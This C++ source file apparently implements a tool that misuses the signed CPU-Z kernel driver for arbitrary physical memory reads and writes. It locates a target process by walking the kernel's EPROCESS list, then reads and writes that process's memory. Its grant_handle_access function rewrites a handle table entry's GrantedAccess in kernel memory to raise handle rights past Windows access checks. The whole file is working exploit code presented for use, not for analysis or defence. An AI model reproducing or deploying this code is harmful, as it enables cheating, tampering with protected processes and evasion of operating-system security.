#include "process.hpp"
#include "windefs.h"
#include <TlHelp32.h>
#include <memory>
#include <string>
#include <stack>

#include "sup.h"
#include "drivers/cpuz/cpuz_driver.hpp"

#define KPROCESS_DIRBASE   0x028
#define EPROCESS_PID       0x180
#define EPROCESS_LINKS     0x188
#define EPROCESS_OBJ_TABLE 0x200

namespace process
{
  struct process_context
  {
    std::uint32_t pid;
    std::uint64_t dir_base;
    std::uint64_t kernel_entry;
  };
  
  std::stack<process_context> context_stack;
  process_context*            cur_context = nullptr;
  
  static std::uint8_t* find_kernel_proc(const char* name)
  {
    static HMODULE ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    static ULONG64 kernelBase = (ULONG64)SupGetKernelBase(NULL);

    if(!kernelBase)
      throw std::runtime_error{ "Could not find the system base." };

    if(!ntoskrnl)
      throw std::runtime_error{ "Failed to load ntoskrnl.exe" };

    auto fn = (std::uint64_t)GetProcAddress(ntoskrnl, name);

    if(!fn) return nullptr;

    return (uint8_t*)(fn - (std::uint64_t)ntoskrnl + kernelBase);
  }

  static process_context find_process_info(std::uint32_t pid)
  {
    process_context info;
    info.pid = 0;

    auto& cpuz = cpuz_driver::instance();

    if(cpuz.ensure_loaded()) {
      // 1. Get PsInitialSystemProcess;
      // 2. Iterate _EPROCESS list until UniqueProcessId == pid;
      // 3. Read _KPROCESS:DirectoryTableBase;
      // 4. Profit.

      // Get the pointer to the system EPROCESS
      auto peprocess = find_kernel_proc("PsInitialSystemProcess");

      // Read EPROCESS address
      auto ntos_entry = cpuz.read_system_address<std::uint64_t>(peprocess);

      auto list_head = ntos_entry + EPROCESS_LINKS;
      auto last_link = cpuz.read_system_address<std::uint64_t>(list_head + sizeof(PVOID));
      auto cur_link  = list_head;

      do {
        auto entry = (std::uint64_t)cur_link - EPROCESS_LINKS;

        auto uniqueProcessId = cpuz.read_system_address<std::uint64_t>(entry + EPROCESS_PID);

        if(uniqueProcessId == pid) {
          info.pid          = pid;
          info.dir_base     = cpuz.read_system_address<std::uint64_t>(entry + KPROCESS_DIRBASE);
          info.kernel_entry = entry;
          break;
        }

        cur_link = cpuz.read_system_address<std::uint64_t>(cur_link);
      } while(cur_link != last_link);
    }
    return info;
  }
  
  std::uint32_t find(const wchar_t* proc)
  {
    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    auto pe       = PROCESSENTRY32W{ sizeof(PROCESSENTRY32W) };

    if(Process32First(snapshot, &pe)) {
      do {
        if(!_wcsicmp(proc, pe.szExeFile)) {
          CloseHandle(snapshot);
          return pe.th32ProcessID;
        }
      } while(Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
  }

  bool attach(std::uint32_t pid)
  {
    auto info = find_process_info(pid);

    if(info.pid != 0) {
      context_stack.push(info);
      cur_context = &context_stack.top();
      return true;
    }
    return false;
  }

  void detach()
  {
    context_stack.pop();
    cur_context = nullptr;
  }

  bool read(PVOID base, PVOID buf, size_t len)
  {
    if(cur_context == nullptr)
      throw std::runtime_error{ "Not attached to a process." };

    auto& cpuz = cpuz_driver::instance();

    auto phys = cpuz.translate_linear_address(cur_context->dir_base, base);

    if(!phys)
      return false;

    return cpuz.read_physical_address(phys, buf, len);
  }

  bool write(PVOID base, PVOID buf, size_t len)
  {
    if(cur_context == nullptr)
      throw std::runtime_error{ "Not attached to a process." };

    auto& cpuz = cpuz_driver::instance();

    auto phys = cpuz.translate_linear_address(cur_context->dir_base, base);

    if(!phys)
      return false;

    return cpuz.write_physical_address(phys, buf, len);
  }

  // 
  // Lookup a handle on the provided handle table.
  // Chages a lot for each Windows version (8, 8.1, 10, etc) 
  // and even between builds. You can find it on your ntoskrnl.exe
  // with the help of MS symbols.
  // 
  PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(HANDLE_TABLE *HandleTable, ULONGLONG Handle)
  {
    ULONGLONG v2;     // r8@2
    ULONGLONG v3;     // rcx@2
    ULONGLONG v4;     // r8@2
    ULONGLONG result; // rax@4
    ULONGLONG v6;     // [sp+8h] [bp+8h]@1

    v6 = Handle;
    v6 = Handle & 0xFFFFFFFC;
    if(v6 >= HandleTable->NextHandleNeedingPool) {
      result = 0i64;
    } else {
      v2 = HandleTable->TableCode;
      v3 = HandleTable->TableCode & 3;
      v4 = v2 - (ULONG)v3;
      if((ULONG)v3) {
        if((DWORD)v3 == 1)
          result = read<ULONGLONG>((PVOID)(((Handle - (Handle & 0x3FF)) >> 7) + v4)) + 4 * (Handle & 0x3FF);
        else
          result = read<ULONGLONG>((PVOID)(read<ULONGLONG>((PVOID)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4)) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF))) + 4 * (Handle & 0x3FF);
      } else {
        result = v4 + 4 * Handle;
      }
    }
    return (PHANDLE_TABLE_ENTRY)result;
  }

  bool grant_handle_access(HANDLE handle, ACCESS_MASK access_rights)
  {
    // 
    // Make sure we are attached to a process
    // 
    if(cur_context == nullptr)
      throw std::runtime_error{ "Not attached to a process." };

    // Grab the handle table
    auto handleTableAddress = read<PHANDLE_TABLE>(PVOID(cur_context->kernel_entry + EPROCESS_OBJ_TABLE));
    auto handleTable        = read<HANDLE_TABLE>(handleTableAddress);

    // Find the entry for the target handle
    auto entryAddress = ExpLookupHandleTableEntry(&handleTable, (ULONGLONG)handle);

    if(!entryAddress)
      return false;

    // Read it
    auto entry = read<HANDLE_TABLE_ENTRY>(entryAddress);

    // Set the access
    entry.GrantedAccess = access_rights;

    // Write it back
    return write<HANDLE_TABLE_ENTRY>(entryAddress, entry);
  }
}